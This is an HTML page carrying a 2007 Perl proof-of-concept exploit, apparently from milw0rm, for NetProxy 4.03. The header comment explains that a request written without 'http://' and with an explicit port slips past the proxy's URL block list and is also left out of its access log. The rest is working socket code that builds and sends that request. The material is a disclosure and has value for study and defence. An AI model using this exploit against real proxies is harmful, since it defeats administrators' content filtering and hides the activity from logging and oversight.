<html><head><title>NetProxy <= 4.03 Web Filter Evasion / Bypass Logging Exploit</title></head><pre>#!/usr/bin/perl
###########################################################################
#
# Application: 
#
#	 NetProxy 4.03
#	 http://www.grok.co.uk/netproxy/index.html
#
# Description:
#
#	 NetProxy includes a powerful web cache to boost 
#	 performance and reduce online costs. There is 
#	 also an application-level firewall to protect your 
#	 network from unwanted access, full access logging 
#	 to allow you to track Internet usage, and 
#	 password-protected access to various Internet resources.
#
# Vulnerability:
#
#	 Sending a specially crafted request to the proxy server 
#	 allows users to view restricted Web content and bypass
#	 the logging feature.
#
# Exploit:
#
#	 Assume that access to http://www.milw0rm.com has been blocked. 
#	 The standard query string sent to NetProxy looks like:
#
#			GET http://www.milw0rm.com HTTP/1.0
#
#	 NetProxy recognizes that this is a blocked URL and subsequently 
#	 blocks the request. However, sending a request without 'http://' 
#	 in the URL allows access to the blocked URL (note that the port 
#	 must be manually specified as well):
#
#			GET www.milw0rm.com:80 HTTP/1.0
#
#	 In addition, requests made in this manner are not logged to 
# 	 NetProxy's connection log file. 
#
# Work-Around/Fix:
#
#	 Since the application automatically prepends the 'http://' string
#	 to every URL specified in the block list, this technique should work 
#	 for all restricted Web sites, and ensures that there is no easy fix 
#	 for this security hole. POC code follows.
#
# Credit:
#
#	 Exploit discovered and coded by Craig Heffner
#	 http://www.craigheffner.com
#	 heffnercj [at] gmail.com
###########################################################################

use IO::Socket;

#Define the NetProxy server and port
$proxy_ip = &quot;127.0.0.1&quot;;
$proxy_port = &quot;8080&quot;;

#Set the site, port and page to request
$site = &quot;www.milw0rm.com&quot;;
$port = &quot;80&quot;;
$page = &quot;index.html&quot;;

#Define FF and IE user agent strings
$ms_ie = &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;;
$ms_ff = &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1&quot;;

#Create connection to NetProxy
my $sock = new IO::Socket::INET(
			Proto =&gt; 'tcp',
			PeerAddr =&gt; $proxy_ip,
			PeerPort =&gt; $proxy_port,
			);
die &quot;Failed to connect to [$proxy_ip:$proxy_port] : $!\n&quot; unless $sock;	

#Format the request
$request = &quot;GET $site:$port/$page HTTP/1.0\r\n&quot;;
$request .= &quot;User-Agent: $ms_ff\r\n&quot;;
$request .= &quot;\r\n&quot;;

#Send the request
print $sock $request;

#Read the reply
while(&lt;$sock&gt;){
	$reply .= $_;
}

close($sock);

#Separate NetProxy header from HTML
($header,$html) = split(&quot;\r\n\r&quot;,$reply);

print $html;

exit;

# milw0rm.com [2007-02-27]</pre></html>